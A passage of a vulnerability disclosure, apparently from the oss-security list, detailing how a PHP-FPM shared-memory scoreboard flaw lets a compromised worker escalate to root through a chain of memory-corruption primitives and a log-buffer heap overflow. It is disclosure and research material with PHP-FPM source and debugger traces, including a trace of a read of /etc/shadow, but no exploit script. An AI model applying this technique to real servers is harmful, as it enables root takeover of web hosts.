is different though, and the exploitation, as a consequence, is as
well.

The vulnerability allows a low-privilege user (such as *www-data*)
to **escalate his privileges to root** using a bug in PHP-FPM, which
has been present for 10 years.

PHP-FPM (FastCGI Process Manager) is the official PHP FastCGI server.
It is used in conjunction with an **HTTP server** such as **Apache
or NGINX** to handle the processing of PHP files. It generally listens
for connections over either a UNIX socket or on TCP port 9000. When
the HTTP server needs to run a PHP file, it will forward parameters,
such as the file path, PHP variables, and configuration to PHP-FPM,
which will send back a response.

If you're wondering if you are vulnerable: if you are using **Apache**
and PHP, you **might be** using PHP-FPM. If you're using **NGINX**
and PHP, you **are** using PHP-FPM. If you are using PHP-FPM, you
are vulnerable.

# Overview of the bug

A low-privilege process can read and write an array of pointers used
by the main process, running as root, through shared memory. An attacker
can leverage this problem to change a 32-bit integer from zero to
one in the main process's memory, or clear a memory region. By leveraging
the primitive multiple times, it is possible to reach another bug,
make the main process execute code, and thus escalate privileges.

# Overview of PHP-FPM

*The behaviour of PHP-FPM is governed by its configuration; we'll
use the standard configuration to explain how it works. YMMV.*

## Main process and workers

PHP-FPM is a FastCGI server. The main process, which generally runs
as `root`, manages less privileged (`www-data`, `nobody`) workers.
When a request is received, the main process forwards it to an idle
worker for processing. The worker sends back a response. The system
is "on demand": if every worker is busy handling a request, the main
process can spawn one or several new workers. Conversely, if there
is not much traffic, the main process can kill workers to save resources.
If a worker somehow crashes or exits, the main process spawns a new
process to take its place. By default, PHP-FPM starts with 2 workers,
and can handle at most 5 concurrent requests (*i.e.* 5 concurrent
workers).

## Scoreboards

In order to know what each worker is doing, each worker manages a
scoreboard (`struct fpm_scoreboard_proc_s`) [1]
. These structures contain a PID, the current state of the worker
(is it handling a request or idle ? Which PHP file is it processing
?), and a few stats alongside (memory and CPU time used).

```cpp
pwndbg> p *fpm_worker_all_pools->scoreboard->procs[0] //
fpm_scoreboard_proc_s
$8 = {
  {
    lock = 0,
    dummy = '\000' <repeats 15 times>
  },
  used = 1,
  start_epoch = 1619077029,
  pid = 1444,
  requests = 0,
  request_stage = FPM_REQUEST_ACCEPTING,
  ...
  request_uri = '\000' <repeats 127 times>,
  query_string = '\000' <repeats 511 times>,
  request_method = '\000' <repeats 15 times>,
  ...
}
```
*Example of a worker scoreboard*

Additionally, the main process aggregates some of these infos in a
main scoreboard (`struct fpm_scoreboard_s`). In there, you can find
the number of active workers (`active`), the number of idle workers
(`idle`), the timestamp at which PHP-FPM started (`start_epoch`)...

```cpp
pwndbg> p *fpm_worker_all_pools->scoreboard // fpm_scoreboard_s
$7 = {
  {
    lock = 0,
    dummy = '\000' <repeats 15 times>
  },
  pool = "www", '\000' <repeats 28 times>,
  pm = 2,
  start_epoch = 1619077029,
  idle = 2,
  active = 0,
  active_max = 0,
  requests = 0,
  max_children_reached = 0,
  lq = 0,
  lq_max = 0,
  lq_len = 0,
  nprocs = 5, // size of the procs array
  free_proc = 2,
  slow_rq = 0,
  procs = 0x7ff114945078 // fpm_scoreboard_proc_s*[] // <---- [1]
}
```
*Main scoreboard*

One of these fields is of interest: the last field of the structure,
`procs`, is an array of pointers to the sub-scoreboards described
right before. When the root process needs to access a sub-scoreboard,
it refers to this array and dereferences its elements.

This implies that the main process has access to the sub-scoreboards,
although they are maintained by workers. How can this be ?

## IPC through SHM

When PHP-FPM starts, it creates a shared memory mapping to store
sub-scoreboards.
Along with the main process, each worker can read and modify the data
in this mapping. It seems insecure: as a worker, you could for instance
modify the scoreboard of other workers, and pretend they are busy,
which could DOS the application. However, this is not dramatic.

Here's what is: the main scoreboard is *also* located in the SHM.
The pointers in `fpm_scoreboard_s.procs[]` are therefore writable
by any worker.
When the root process tries to use sub-scoreboards, we can make it
read or write outside the SHM, right inside its own memory !

*As a quick test, you can set `scoreboard->procs[0]` to an unmapped
address from a worker process and watch the main process crash almost
instantly, as it tries to dereference it.*

Using PHP sandbox escape bugs, like the one described
[here](<https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/>),
one can get full control over a worker's memory, and use it to modify
the `fpm_scoreboard_s.procs[]` pointers, in order to make the main
process use fake `fpm_scoreboard_proc_s` structures.

However, unlike with the Apache HTTPd exploit, there is no easy way
to reach an arbitrary function call from this bug. In fact, there's
actually not much we can do with it! We'll go over this in the next
section.

# Process scoreboard management and the bad primitive

In order to understand what we can do with these pointers, we need
to understand how PHP-FPM manages sub-scoreboards during the shutdown
and creation of workers.

PHP-FPM maintains, while running, a linked list of running children
(workers), each represented by a `fpm_child_s` structure. They are
stored on the heap (libc's, not PHP's).

Additionally, PHP-FPM wishes to collect a few stats about its running
workers. Therefore, when it starts, the main process allocates, **in
the shared memory**, the main scoreboard (`fpm_scoreboard_s`), and
a number of `fpm_scoreboard_proc_s` structures equal to the maximum
number of workers (by default, 5). It then fills the
`fpm_scoreboard->procs[]`
array with pointers to these.

Before it spawns a new worker, the main process needs to find it a
scoreboard to use. To do so, picks an unused sub-scoreboard, marks
it as used, and links it to the worker.

When a worker dies, it does not need a sub-scoreboard anymore. PHP-FPM
finds its index through another structure, and then wipes the whole
structure.

Both operations happen **in the main process, as root**. They are
respectively done by the following functions: `fpm_scoreboard_proc_alloc()`
and `fpm_scoreboard_proc_free()`. Let's rapidly check the code for
both functions.

```cpp
// fpm_scoreboard.c

int fpm_scoreboard_proc_alloc(struct fpm_scoreboard_s *scoreboard,
int *child_index) /* {{{ */
{
    int i = -1;

    [...]

    /* first try the slot which is supposed to be free */
    if (scoreboard->free_proc >= 0 && (unsigned int)scoreboard->free_proc
< scoreboard->nprocs) {
        if (scoreboard->procs[scoreboard->free_proc] &&
!scoreboard->procs[scoreboard->free_proc]->used)
{
            i = scoreboard->free_proc;
        }
    }

    // [1]
    if (i < 0) { /* the supposed free slot is not, let's search for a
free slot */
        zlog(ZLOG_DEBUG, "[pool %s] the proc->free_slot was not free. Let's
search", scoreboard->pool);
        for (i = 0; i < (int)scoreboard->nprocs; i++) {
            if (scoreboard->procs[i] && !scoreboard->procs[i]->used) {
/* found
*/
                break;
            }
        }
    }

    /* no free slot */
    if (i < 0 || i >= (int)scoreboard->nprocs) {
        zlog(ZLOG_ERROR, "[pool %s] no free scoreboard slot",
scoreboard->pool);
        return -1;
    }

    scoreboard->procs[i]->used = 1; // [2]
    *child_index = i; // [3]

    /* supposed next slot is free */
    if (i + 1 >= (int)scoreboard->nprocs) {
        scoreboard->free_proc = 0;
    } else {
        scoreboard->free_proc = i + 1;
    }

    return 0;
}
```

The first function will find an unused structure [1], mark it as used
[2], and return its index [3].

```cpp
void fpm_scoreboard_proc_free(struct fpm_scoreboard_s *scoreboard,
int child_index) /* {{{ */
{
    if (!scoreboard) {
        return;
    }

    if (child_index < 0 || (unsigned int)child_index >= scoreboard->nprocs)
{
        return;
    }

    if (scoreboard->procs[child_index] &&
scoreboard->procs[child_index]->used
> 0) { // [4]
        memset(scoreboard->procs[child_index], 0, sizeof(struct
fpm_scoreboard_proc_s));
// [5]
    }

    /* set this slot as free to avoid search on next alloc */
    scoreboard->free_proc = child_index;
}
```

The second function will receive the index of the sub-scoreboard of
a dying child, and clear it [5], but only if its `used` flag is superior
to zero [4].

To speed up the allocation process, the field `scoreboard->free_proc`
keeps track of the sub-scoreboard that was freed last. When a sub-scoreboard
needs to be allocated, this index will be checked first.

The array containing addresses of every sub-scoreboard,
`scoreboard->procs[]`,
is located in the shared memory: it can be modified by any worker
process. Furthermore, the process of allocating a sub-scoreboard can
be easily triggered as a worker by creating several concurrent requests,
and freeing a sub-scoreboard can be done by killing a worker.

As such, we can trigger those functions as an attacker: we can use
this to make the main process change a 32-bit integer from zero to
one (using *2*), or clear a huge memory region (using *5*).

## An example

Let's say we want to set an integer at address `0x555600000038` in
the main process' heap to `1`. It is originally `0`.

We set `scoreboard->procs[2]` to `0x555600000028` (`used` is at offset
`0x10`), and kill the associated worker.
`fpm_scoreboard_proc_free(scoreboard,
2)` is called, and since `scoreboard->procs[2]->used`  (`0x555600000038`)
is zero, it just sets `scoreboard->free_proc` to `2` and returns.

Then, before spawning a new worker, `fpm_scoreboard_proc_alloc()`
gets called. It checks `scoreboard->procs[scoreboard->free_proc]->used`,
sees that is it *zero*, and sets it to *one*. It then sets
`scoreboard->free_proc`
to `2+1=3` and returns.

However, if, for some reason, the integer at address `0x555600000038`
happens to be *not* zero, the impact is very different.
`fpm_scoreboard_proc_free()`
checks `scoreboard->procs[2]->used`, sees that it is nonzero, and
therefore calls `memset(0x555600000028, 0, 1168)`, destroying a significant
part of memory around (and mostly after) the address.

This is a risky primitive: due to the small size of internal PHP-FPM
structures, 1168 represents a huge size. If we somehow mess up, we
could destroy important data, and probably crash the main process.

However, we got our primitives: we make an element of `scoreboard->procs[]`
point to wherever we want, and kill the associated worker. Depending
on the value of its `used` field, it will either be set to `1`, or
clear 1168 bytes around it.

*From now on, these primitives will be named respectively the* set-0-to-1
*and* clear-1168-bytes *primitives*.

# Exploitation

From now on, we assume that we have complete read/write in workers
using a [PHP sandbox escape (*e.g.* `SplDoublyLinkedList::offsetUnset`).
We can force the creation of workers by sending several concurrent
requests, and kill any worker by sending it a `SIGKILL` signal.

We want to escalate from a full read-write access in a worker process
to code execution in the root process.

To do so, we have a few things going for us:

- Since workers are forked from the main process, they share the same
memory mappings (ASLR is insignificant).
- Their heap is similar as well: although a lot of allocs/deallocs
happen when a worker spawns, we can still get a decent idea of the
contents of the heap of the main process by reading its child's memory.
- Finally, if we somehow crash a child during the exploitation, the
main process will restart it.

However, we also have a few problems:

- The primitive is bad: if `used` does not have the value we expect,
we'll destroy 1168 bytes of memory instead of just changing one bit
from `0` to `1`; generally, this means a crash. If the main process
crashes, it's game over for you and the website. Even if we manage
to not mess it up, we can clear a huge memory range or change a zero
into a one. That's not much to work with.
- After a fork, the worker will free lots of structures, because they
are only used by the main process. If somehow the newly-spawned worker
has an incorrect heap state when it spawns, it will exit or crash.
And the main process will therefore spawn a new, still messed up,
worker. Which will exit again. This will go on indefinitely, and cause
a DOS.
- In order to control our primitive, we will have to spawn and kill
workers in rapid succession. If a normal user browses the website
at an inconvenient time, he might mess up our exploit, which might
crash the root process.

In short, there are many ways to destroy the main process, and there
aren't many ways to get code execution.

## Tailoring the primitive

Although we have a decent idea of the main process' memory layout,
we can't always be 100% sure that a given 32-bit integer is zero.
Thus, our two primitives might get mixed-up, and we may as a result
crash the process.

To avoid this, we first kill a worker, and then change the
`scoreboard->procs[]`
element only after `fpm_scoreboard_free_proc()` has been killed. This
can easily be done by monitoring the value of `scoreboard->free_proc`,
which is changed at the end of the function. Then, as soon as
`fpm_scoreboard_free_alloc()`
has been called, we reset the pointer (again, we can monitor `free_proc`
for this).

With a few additional tricks involving the scoreboard structure and
out-of-scope of the article, we can garantee that, although we don't
always win the race, we never break anything.

Our *set-0-to-1* primitive just got a little better: we cannot trigger
`memset()` by mistake anymore, and have one less way to destroy PHP-FPM.
Other are coming.

## Reaching the heap: setting `catch_workers_output`

Now that our *set-0-to-1* primitive is safe, we need to find a use
for it. By itself, it is not much use: we can corrupt a length, or
a chunk size for instance, but we cannot create arbitrary data in
the main process (except in the shared memory segment). In other words,
maybe we can make something bigger, but we can't make it contain data
we control.

We therefore need a way to send data to the main process, and there's
a perfect solution in the worker pool configuration:

```cpp
pwndbg> p *fpm_worker_all_pools->config
$2 = {
  name = 0x559e247bf020 "www",
  prefix = 0x0,
  user = 0x559e247b73d0 "www-data",
  group = 0x559e247b73f0 "www-data",
  listen_address = 0x559e247b73a0 "/run/php/php7.4-fpm.sock",
  listen_backlog = 511,
  listen_owner = 0x559e247b7440 "www-data",
  listen_group = 0x559e247b7460 "www-data",
  listen_mode = 0x0,
  listen_allowed_clients = 0x0,
  process_priority = 64,
  process_dumpable = 0,
  pm = 2,
  ...
  rlimit_files = 0,
  rlimit_core = 0,
  chroot = 0x0,
  chdir = 0x0,
  catch_workers_output = 0, // <-----------------
  decorate_workers_output = 1,
  clear_env = 1,
  security_limit_extensions = 0x559e247b7480 ".php .phar",
  env = 0x0,
  php_admin_values = 0x0,
  php_values = 0x0,
  apparmor_hat = 0x0,
  listen_acl_users = 0x0,
  listen_acl_groups = 0x0
}
```

There are a lot of things in there, but one looks very interesting:
`catch_workers_output`. Its use is to aggregate the output from workers
into a single log file, `php-fpm.log`.

As such, when set, if a worker writes to *stdout* or *stderr*, the
data is sent to the root process, which buffers it until a newline
is encountered. When this happens, the line is stored into the log
file, and the buffer gets flushed. This buffer is by default of fixed
size, `1024`, and allocated on the heap.

`catch_workers_output` is *OFF* (`0`) by default. We use the primitive
to set it to `1`.
We can now send *almost* arbitrary data in the main process' heap;
we just need to write into workers' *stderr*.

## Good enough ?

Now that we can send (almost) arbitrary data in the root process'
heap, and have two primitive, we could easily go for an heap attack.
By using the *set-0-to-1* primitive, we could for instance change
a chunk size; by using the other primitive, we could clear a tcache
pointer LSB...

An example: we could use 3 workers to force the allocation of 3 contiguous
log buffers, and free them in a chosen order. Since they all fit in
the tcache, we could overwrite the LSB of the pointer of the first
chunk using our *clear-1168-bytes* primitive, and we'd have a good
starting point.

However, this attack, along with many others, rely on having, at some
point, an unstable heap.
If a legitimate client were to send a request at this point in time,
it would probably have very bad effects: crash, DOS, ...

Even using different approaches, the conclusion remains the same:
however good an exploitation strategy is in theory, if legitimate
requests (and their potential errors) were handled at critical stage
of the exploit, a crash would be very likely. We need to find a way
to keep the server to ourselves.

## All your bases

Between each step of the exploit, a number of legitimate requests
can happen. This causes a few problems.

### Persistent worker control

If we were to send an FCGI request for each "action" we want a worker
to perform, there'd be no garantee that the process that executes
the first request is the same as the one handling the second one.
Furthermore, as legitimate requests get intertwined with ours, we
often get unpredictable behaviour.

We therefore build the exploit as a python **C&C server** which spawns
PHP workers and keeps them alive for as long as required. The server
and the workers communicate through a custom IPC mechanism (*read:
a JSON file and a few `while(true)` loops*).

This enables us to create workers, make them execute commands, and
then stop or kill them at will. In other words, we know which process
executes which actions, and that it does not execute anything else
in between.

However, standard requests can still be assigned to workers we do
not control, or slip in when we kill a worker and try to take control
of a new one.

### Capping the number of workers

Whenever a new worker is forked from the main process, it gets rid
of unneeded structures. Such structures include all workers' `zlog_stream`
and `buffer`. It'll also allocate new stuff, which will trigger
`malloc_consolidate()`.
In each of our exploitation ideas, the heap is, for very short times,
in an invalid state: a chunk header could be invalid, an entry could
be present twice in the tcache... Say a worker gets spawned at this
time. It inherits the bad heap, tries to use it... and the libc shouts
an error and raises `SIGABRT`. Usually we would not care: PHP-FPM
restarts its crashed children. However, since we enabled
`catch_workers_output`,
the error message is sent back to the main process, which, as it's
supposed to, creates a log buffer to receive the error. The heap being
broken in main process as well, the main process ends up crashing too!

Even if the worker process crashes silently, the main process respawns
it before doing anything else. It'll crash again, resulting an endless
loop of birth and death for processes.

Consequently, we need a way to block the main process from spawning
workers. Remember, before spawning a worker, the main process will
make sure that a sub-scoreboard is available for it to use. An obvious
idea is to set the `->used` flag of every `scoreboard->procs[]` to
`1`. However, this proves really hard when the main process repeatedly
spawns new workers: you need to set it right after the structure has
been nulled. Luckily, `fpm_scoreboard_proc_free()` and
`fpm_scoreboard_proc_alloc()`
behave a little bit differently:

```cpp
// fpm_scoreboard.c

int fpm_scoreboard_proc_alloc(struct fpm_scoreboard_s *scoreboard,
int *child_index) /* {{{ */
{
    [...]

    if (i < 0) { /* the supposed free slot is not, let's search for a
free slot */
        zlog(ZLOG_DEBUG, "[pool %s] the proc->free_slot was not free. Let's
search", scoreboard->pool);
        for (i = 0; i < (int)scoreboard->nprocs; i++) {
            if (scoreboard->procs[i] && !scoreboard->procs[i]->used) {
/* found
*/ // <--- HERE
                break;
            }
        }
    }

    [...]
}

void fpm_scoreboard_proc_free(struct fpm_scoreboard_s *scoreboard,
int child_index) /* {{{ */
{
    if (scoreboard->procs[child_index] &&
scoreboard->procs[child_index]->used
> 0) { // <--- HERE
        memset(scoreboard->procs[child_index], 0, sizeof(struct
fpm_scoreboard_proc_s));
    }
}
```

If you look at the code again, you'll notice that
`fpm_scoreboard_proc_free()`
checks that `used` is *superior* to zero, while
`fpm_scoreboard_proc_alloc()`
checks that it is *different* from zero. As such, **setting `used`
to `-1` blocks both functions from doing anything**.

This allows us to block workers from spawning, and thus cap the maximum
number of workers. For instance, in the default configuration, which
allows *5* concurrent workers at most, if we set `used` to `-1` on
*3* sub-scoreboards, PHP-FPM will only be able to spawn *2*.

Furthermore, when we kill a worker, we can even preemptively set its
`used` flag to `-1`, making sure PHP won't respawn one right after.

Another consequence is that we can now tailor our exploit for the
default configuration of 5 maximum concurrent workers. If the targeted
PHP-FPM service happens to allow more, we'll just cap this number
back to 5. We can build a configuration-agnostic exploit.

### Closed FD

Because of our hotfix of `catch_workers_output`, when PHP-FPM spawns
workers at a very heavy rate, a race condition can happen where the
*fd* supposed to receive CGI requests is closed right before it is
used. This causes the worker to exit straight away (if it can't receive
requests, what's the point of being alive), leading the main process
to respawn it. However, the immediate respawn yields exactly the same
problem, and the worker exits again. Infinite loop. Luckily, this
can be solved by blocking the spawn of workers for a few moments,
using the same technique as described above.

There's one thing left to tackle: legitimate requests which produce
errors.

### Error-free PHP

Let's say it: PHP is probably one of the web language that produces
the most errors without crashing. Warning, Notice, Deprecation, the
list goes on.

Those errors become annoying as soon as we enable `catch_workers_output`:
they get written to *stderr*, and as such are transfered to the main
process, which will create log streams and buffers to store them.
Since these heap chunks are the only we can control, we'd like to
keep them to ourselves.

Luckily, before a PHP error is written to an FD, lots of things happen.
Here's an example stack trace in a worker process which yields an
error:

```cpp
pwndbg> bt
...
#2  0x00007f8b43e71cb8 in persistent_error_cb (type=2,
error_filename=0x4121d7c0
"/var/www/html/gid.php", error_lineno=6, message=0x7f8b43c02200) at
./ext/opcache/ZendAccelerator.c:1671
#3  0x000055e53ff5069c in zend_error_impl (orig_type=orig_type@...ry=2,
error_filename=0x4121d7c0 "/var/www/html/gid.php", error_lineno=<optimized
out>, message=message@...ry=0x7f8b43c02200) at ./Zend/zend.c:1339
#4  0x000055e53ff50e6c in zend_error_zstr (type=type@...ry=2,
message=message@...ry=0x7f8b43c02200)
at ./Zend/zend.c:1530
#5  0x000055e53ff4c348 in php_verror (docref=<optimized out>,
params=<optimized
out>, type=2, format=<optimized out>, args=args@...ry=0x7fff7e7df170)
at ./main/main.c:1064
#6  0x000055e53ff4c6e9 in php_error_docref1 (docref=docref@...ry=0x0,
param1=param1@...ry=0x7f8b43c61010 "/etc/shadow", type=type@...ry=2,
format=format@...ry=0x55e5401fc498 "%s: %s") at ./main/main.c:1088
#7  0x000055e5400c8d64 in php_stream_display_wrapper_errors
(wrapper=wrapper@...ry=0x55e540314320
<php_plain_files_wrapper>, path=path@...ry=0x40b99ff8 "/etc/shadow",
caption=caption@...ry=0x55e5401fecf6 "Failed to open stream") at
./main/streams/streams.c:213
...
#19 0x000055e53ff6ccae in _start () at ./ext/standard/file.c:2428
```

In `persistent_error_cb()`, we have the following code:

```cpp
// ext/opcache/ZendAccelerator.c
static void persistent_error_cb(int type, const char *error_filename,
const uint32_t error_lineno, zend_string *message) {
    if (ZCG(record_warnings)) { // [1]
        zend_recorded_warning *warning =
emalloc(sizeof(zend_recorded_warning));
        warning->type = type;
        warning->error_lineno = error_lineno;
        warning->error_filename = zend_string_init(error_filename,
strlen(error_filename),
0);
        warning->error_message = zend_string_copy(message);

        ZCG(num_warnings)++;
        ZCG(warnings) = erealloc(ZCG(warnings),
sizeof(zend_recorded_warning)
* ZCG(num_warnings)); // [2]
        ZCG(warnings)[ZCG(num_warnings)-1] = warning;
    }
    accelerator_orig_zend_error_cb(type, error_filename, error_lineno,
message);
}
```

`ZCG(some_key)` expands to `accel_globals.some_key`. This `accel_globals`
structure is inherited from the main process, and contains many empty
fields, like `ZCG(record_warnings)` [1] and `ZCG(warnings)` [2]. **By
setting both to `1` using our *set-0-to-1* primitive, each worker
process will inherit the values**. As a consequence, any PHP error
will cause `persistent_error_cb()` to enter the `if` block, and will
end up calling `erealloc()` with `1` at its first parameter, thus
crashing the worker. Since the worker crashes before it writes to
*stderr*, the error is never received by the main process, and no
heap chunks are allocated.

Using all these tweaks, we are able to gracefully control which worker
executes what, how many workers spawn, and block PHP errors from messing
up our exploit.

## Problem-free exploitation tactics

With all these problems behind us, we are ready to find a valid exploitation
idea. Remember the overlapping chunk attack discussed in the previous
section ?

In practice, this is way harder: since we hotfixed `catch_workers_output`,
PHP-FPM did not get the chance to set up the FDs it needs to interact
with the workers. As such, some workers can only send data to the
main process using *stdout*, other only with *stderr*. Others cannot
send anything. Even worse, sometimes, workers write on behalf of others.
It makes it really hard to have three contiguous chunks. And this
is only the first requirement of our attack.

## Managing streams: `zlog_stream`

In order to manage *stderr* buffers in the main process, PHP-FPM allocates,
for each worker, another structure: `zlog_stream`. It contains the
address of the buffer, its size, the number of characters written
into it, etc.

Let's look at a bit more.

```cpp
pwndbg> p *fpm_worker_all_pools->children->next->log_stream
$1 = {
  ...
  child_pid = 1844634,
  function = 0x0,
  buf = {
    data = 0x0, // buffer pointer
    size = 0 // buffer size
  },
  len = 0, // position of the write cursor in the buffer
  buf_init_size = 1024, // default size to allocate buffer with
  ...
  msg_prefix = 0x564794d2a860 "[pool www] child 1844634 said into
stderr: ",
  ...
}
```
*Example of `zlog_stream` structure.*

When a worker sends its first bytes to stderr, the `zlog_stream` gets
created. At first, no buffer gets allocated: `stream->buf.data` is
`NULL`, and `stream->buf.size` is `0`. The position of the cursor,
`stream->len`, is also zero.

When *stderr* is not an empty line, the log stream creates a buffer
to store the sent characters. Sending `test\n` results in the following
changes:

```cpp
pwndbg> p *fpm_worker_all_pools->children->next->log_stream
$1 = {
  ...
  child_pid = 1844634,
  function = 0x0,
  buf = {
    data = 0x55ec5bed7a40 "[31-May-2021 16:10:35] WARNING: [pool www]
child 1844635 said into stderr: \"test\"\n",
    size = 1024
  },
  len = 48,
  buf_init_size = 1024, // default size to allocate buffer with
  ...
  msg_prefix = 0x564794d2a860 "[pool www] child 1844634 said into
stderr: ",
  ...
}
```
*Example of `zlog_stream` structure.*

A buffer of size `1024` was created, and our 4-letter payload was
written, but with a little twist: a prefix was added by PHP-FPM. It
does this so that, when this string finally gets written into the
log file, one can to find out which worker wrote what.

Now that we have a basic (but sufficient) overview of log streams,
lets dive into the code responsible for appending data to a buffer.

## Unreachable heap overflow

As mentioned previously, whenever a worker writes to *stderr*, the
first step achieved by the main process is to create a `zlog_stream`
structure (if it has not been done already).

After this, it reads from the corresponding FD, and calls
`zlog_stream_str()`,
which, if something was read, calls `zlog_stream_buf_append()` [1]:

```cpp
static ssize_t zlog_stream_buf_append(
        struct zlog_stream *stream, const char *str, size_t str_len) //
[1]
{
    int over_limit = 0;
    size_t available_len, required_len, reserved_len;

    if (stream->len == 0) {
        stream->len = zlog_stream_prefix_ex(stream, stream->function,
stream->line);
// [2]
    }

    /* msg_suffix_len and msg_quote are used only for wrapping */
    reserved_len = stream->len + stream->msg_suffix_len + stream->msg_quote;
    required_len = reserved_len + str_len;
    if (required_len >= zlog_limit) { // [3]
        over_limit = 1;
        available_len = zlog_limit - reserved_len - 1;
    } else {
        available_len = str_len;
    }

    if (zlog_stream_buf_copy_cstr(stream, str, available_len) < 0) {
// [4]
        return -1;
    }

    if (!over_limit) {
        return available_len;
    }

    ...
    return available_len;
}
```

Let's review the arguments: `stream` is the log stream responsible
for the worker, `str` contains the bytes written to `stderr`, and
`str_len` the number of bytes written.

If nothing has been written to the buffer yet (`stream->len` is zero),
`zlog_stream_prefix_ex()` gets called. If `stream->buf.data` is not
allocated yet, this is done, with size `stream->buf_init_size` (1024).
After this, `stream->msg_prefix` is added to the beginning of the
message, and `len` is incremented accordingly [2].

Then, PHP-FPM verifies that the total size required to store the data
is not over the global maximum, `zlog_limit` [3]. This is an integer
which is equal to 1024. This is as simple as this: you cannot write
more than 1024 bytes in `stream->buf.data`, ever.

Then comes the call to `zlog_stream_buf_copy_cstr()` [4]:

```cpp
static inline ssize_t zlog_stream_buf_copy_cstr(
        struct zlog_stream *stream, const char *str, size_t str_len) /*
{{{ */
{
    if (stream->buf.size - stream->len <= str_len /* [5] */
        && !zlog_stream_buf_alloc_ex(stream, str_len) /* [6] */) {
        return -1;
    }

    memcpy(stream->buf.data + stream->len, str, str_len); // [7]
    stream->len += str_len;

    return str_len;
}
```

If there is not enough size remaining in the buffer[5], it is
reallocated[6].
We enter the last function, `zlog_stream_buf_alloc_ex()`:

```cpp
static zlog_bool zlog_stream_buf_alloc_ex(struct zlog_stream *stream,
size_t needed)  /* {{{ */
{
    char *buf;
    size_t size = stream->buf.size ?: stream->buf_init_size;

    if (stream->buf.data) {
        size = MIN(zlog_limit, MAX(size * 2, needed));
        buf = realloc(stream->buf.data, size);
    } else {
        size = MIN(zlog_limit, MAX(size, needed));
        buf = malloc(size);
    }

    if (buf == NULL) {
        return 0;
    }

    stream->buf.data = buf;
    stream->buf.size = size;

    return 1;
}
```

As you can see, an horrible error happens: the buffer is (re)allocated
in function of `needed`, while `stream->len` is completely disregarded.
This causes an overflow on the `memcpy()` call [7] of the parent function,
which goes as far as `stream->len + str_len`, while the size of the
buffer is `str_len`.

However, as previously mentioned, when the first bytes of *stderr*
make their way to the main process, a prefix will be prepended, thus
creating a buffer of size `1024` [2]. The code snippet right after
forbids us from writing more than `1024` bytes into a buffer; this
prevents us from triggering the overflow in a normal situation.

## Faking the streams, getting root

### Heap overflow

We still have one thing going for us: our beloved *set-0-to-1* primitive.

We can spoof `stream->len` and `stream->buf.size` using it, but `zlog_limit`
acts as an upper bound. As such, when they are zero, we can only give
them one of 3 possible values: `1`, `0x100`, and `0x101` (because
`0x10000 > zlog_limit`).

Let's say we set both to `L`, and we write `N` bytes to *stderr* (with
`L + N < zlog_limit - 2`). This happens:

1. `zlog_stream_buf_append(stream, str, N)`.
2. `zlog_stream_prefix_ex()` is not called, and `stream->buf.data`
stays `NULL`.
3. `required_len < zlog_limit`, thus `available_len = N`.
4. `zlog_stream_buf_copy_cstr(stream, str, N)` called.
5. Since both `buf.size` and `len` are equal, the check is always
true.
6. `zlog_stream_buf_alloc_ex(stream, N)` gets called, and it allocates
`N` bytes.
7. `memcpy(stream->buf.data + L, str, N)` is called, overflowing of
`L` bytes.

We can thus create a log buffer of any size `N`, and overflow `L`
(`1`, `0x100` or `0x101`) bytes after it.

However, the objects contained in the heap are pretty small; these
overflow sizes are either way too tiny or a little too much for our
liking. We need to go a little bit further. First, we exploit with
`L=1`, and we obtain the following `log_stream` structure:

```cpp
stream->buf.data = malloc(N)
stream->buf.size = N
stream->len = N + 1
```

Then, we can apply the primitive again on the third byte of `buf.size`.
We get:

```cpp
stream->buf.data = malloc(N)
stream->buf.size = 0x10000 | N
stream->len = N + 1
```

Then, if we write `M` additional bytes to *stderr*, we have:

1. `zlog_stream_buf_append(stream, str, M)`.
2. `zlog_stream_prefix_ex()` is not called
3. `required_len < zlog_limit`, thus `available_len = M`.
4. `zlog_stream_buf_copy_cstr(stream, str, M)` called.
5. Since `buf.size` is huge, and `len` is small, the check is always
false.
6. `zlog_stream_buf_alloc_ex(stream, N)` not called
7. `memcpy(stream->buf.data + 1 + N, str, M)` is called, overflowing
of `1 + M` bytes.

We now have an overflow of size `M + 1`, on a buffer of size `N`,
with both variables almost arbitrary.

#### Arbitrary write

Creating a log stream will yield a `zlog_stream` chunk (`0x80`), and
a `msg_prefix` chunk (`0x40`). We can create one for any worker. We
create as many as possible, and look for a stream chunk (refered to
as `@...rflowed`) which is immediately preceeded by either a stream
chunk or a msg prefix chunk, `@...laced`. We also pick another log
stream, which we name `@...rupted`.

By applying the *set-0-to-1* primitive to `@...rupted->buf.size` and
`@...rupted->len`, we can allocate a chunk of any size `N` by sending
`N` bytes to `@...rupted`'s *stderr*. We use this to allocate where
`@...laced` was located. `@...rupted->buf.data` now points on the
chunk right before `@...rflowed`.

We now apply the primitive one last time, so that `@...rupted->buf.size`
gets incremented by `0x10000`. We can now write out-of-bounds, *i.e.*
overwrite `@...rflowed`. We can make its `buf.data` point to anything
! However, we can only do it once.

We therefore make `@...rflowed->buf.data` point to `@...rupted`. By
writing in `@...rflowed`'s *stderr*, we can modify `@...rupted`
(`zlog_stream`),
and the address its buffer points to. We can then write to `@...rupted`'s
*stderr* to write what we want, where we want it.

This way, we have one log stream that writes another: we got recurrent
arbitrary write.
From there, we can fix the configuration, the heap, and finally overwrite
function pointers to get code execution.

# Demo

See on link.

# Vulnerable versions

The exploit technique documented here makes use of a feature that
appeared in PHP 7.2. However, the pointers in the SHM have been present
from the first implementation, dating from PHP 5.3.7.
!

The bug was patched by converting `scoreboard->procs` to an array
of scoreboards (no pointers anymore) and making sure `scoreboard->nprocs`
only gets used by workers. You can find the main commit here:
<https://github.com/php/php-src/commit/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b>
The patched release is PHP-8.0.12.

# Conclusion

Due to the growing adoption of NGINX instead of Apache, a good look
at PHP-FPM was in order. An oversight in the design of the shared
memory region lead to half-decent exploitation primitives, which in
turn lead to a `root` privilege escalation.

The exploit will be available at a later date.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_884ba257_20250115_115342.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

